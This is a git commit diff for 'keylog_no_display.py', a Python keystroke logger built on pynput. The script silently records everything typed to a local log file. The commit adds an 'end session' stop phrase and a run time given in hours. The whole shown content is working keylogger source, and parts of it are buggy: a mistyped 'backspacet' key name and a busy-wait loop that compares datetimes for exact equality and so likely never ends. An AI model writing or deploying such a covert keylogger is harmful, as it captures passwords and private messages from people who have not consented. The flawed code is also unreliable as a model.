74d481864d2be8feafa19b1c3d533566326cda2d
Reyogin <bertrand.ha@epita.fr>
2020-12-11 16:32:45 +0100

    [TIMER] Added timer functionality (works only with hours)

--- keylog_no_display.py
+++ keylog_no_display.py
@@ -1,9 +1,12 @@
 from pynput.keyboard import Key, Listener
 import logging
+import datetime
+import sys
 
 log_file='/home/bertrand/Desktop/file_no_display.log'
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
 message = ""
+# stop = False
 
 def on_press(key):
     global message
@@ -13,6 +16,8 @@ def on_press(key):
         elif key.name == 'enter':
             #if key pressed is enter
             logging.info(message)
+            if message == "end session":
+                exit(0)
             message = ""
         elif key.name == 'backspacet':
             message = message[:-1]
@@ -22,7 +27,18 @@ def on_press(key):
             logging.info(key.name)
             message = ""
     else:
+        if not key.char and key.vk == 65027:
+            return
         message += key.char
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+def main(time):
+    start = datetime.datetime.now()
+    duration = datetime.timedelta(hours=int(time))
+    end = start + duration
+    current = datetime.datetime.now()
+    listener = Listener(on_press=on_press)
+    listener.start()
+    while current != end:
+        current = datetime.datetime.now()
+
+main(sys.argv[1])
